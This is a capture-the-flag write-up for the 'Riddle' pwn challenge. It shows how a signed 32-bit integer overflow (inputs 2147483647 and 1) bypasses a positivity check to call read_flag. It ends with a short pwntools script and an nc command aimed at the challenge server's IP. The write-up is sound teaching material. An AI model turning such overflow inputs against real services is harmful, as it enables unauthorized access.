# Riddle

**Category:** Pwn  
**Competition:** Global Ynov Partners CTF 2026  
**Server:** `154.57.164.73:31387` (Docker)  

---

## Challenge Description

> Shall we take a break and indulge in a game? Riddles and games are universally adored, but does anyone truly relish math?

We're given a zip containing: an ELF binary called `riddle`, a `flag.txt` placeholder, and a `glibc/` folder with a specific `libc.so.6` and linker. The bundled libc is a classic pattern — it ties the binary to a specific version, which usually matters for heap exploits. I filed that away and kept going.

---

## Step 1: Inventory the Zip

```bash
unzip -l riddle.zip
```

```
riddle          # the binary
flag.txt        # placeholder
glibc/libc.so.6
glibc/ld-linux-x86-64.so.2
```

The bundled libc signals this might be an environment-sensitive exploit. Noted.

---

## Step 2: Profile the Binary

```bash
file riddle
```

```
riddle: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

**Not stripped** is a gift. Function names are preserved, which means I don't have to guess what anything does in the disassembler.

---

## Step 3: Check Security Mitigations

```bash
readelf -d riddle | grep -i needed
readelf -s riddle | grep -i __stack
```

Manual checks confirmed all four modern protections are active:

- **PIE** — addresses randomized at load time
- **Stack canary** — `__stack_chk_fail` is imported
- **Full RELRO** — GOT is read-only, GOT overwrites are off the table
- **NX** — stack is not executable

Seeing all four active told me pretty clearly: this is *not* a buffer overflow or shellcode challenge. Something else is going on. My suspicion shifted toward logic exploitation.

---

## Step 4: Read the Symbol Table

```bash
nm riddle
```

Immediately visible: `main`, `menu`, `read_flag`, `read_num`, `banner`, `setup`. The fact that `read_flag` exists as a named standalone function is the whole puzzle. The goal is clearly to trigger that function through some input path, not through memory corruption.

I also noticed `scanf` and `strtoul` as imported libc functions — numeric input parsing is involved.

---

## Step 5: Extract Strings

```bash
strings riddle
```

One line stood out immediately:

> *"It's riddle time! Enter 2 numbers where n1, n2 > 0 and n1 + n2 < 0"*

There it is. The riddle spelled out in plain English. You need two positive numbers whose sum is negative. Mathematically impossible with real numbers — but computers use fixed-width integers, which means overflow.

---

## Step 6: Confirm the Logic in the Disassembly

I disassembled `menu` to understand exactly how the checks work:

```bash
objdump -d riddle | grep -A 60 "<menu>:"
```

Three critical observations:

- `n1` and `n2` are stored as `DWORD PTR` — 32-bit storage
- The positive check uses `js` (jump if signed), meaning the CPU treats these as **signed 32-bit integers**
- The control flow is: if either input is negative → exit; if sum is negative → call `read_flag`; if sum is positive → print "wrong"

The `js` instruction is the smoking gun. The CPU's signed overflow behavior is exactly the exploit surface.

---

## Step 7: Derive the Answer

A signed 32-bit integer holds values from −2,147,483,648 to 2,147,483,647.

If I enter:
- `n1 = 2147483647` (INT32_MAX)
- `n2 = 1`

Both pass the `> 0` individual checks. But the addition `2147483647 + 1` overflows: the hardware produces `2147483648`, which doesn't fit in 32 bits as a signed value, so it wraps to `−2147483648`.

The `js` branch fires, `read_flag` is called, and we get the flag.

---

## Exploit

```python
from pwn import *

p = remote('154.57.164.73', 31387)

p.recvuntil(b'n1')
p.sendline(b'2147483647')
p.recvuntil(b'n2')
p.sendline(b'1')

print(p.recvall().decode())
```

Or simply with netcat and manual input:

```bash
nc 154.57.164.73 31387
# Enter: 2147483647
# Enter: 1
```

---

## Key Takeaway

This challenge is an elegant integer overflow puzzle disguised as a math riddle. The binary has full modern protections so you immediately know you're not going to smash the stack — instead you're exploiting how the CPU represents signed integers. The moment you see `js` in the disassembly and 32-bit storage for user-controlled values, the path is clear. Classic "impossible math" riddle, real computer behavior.
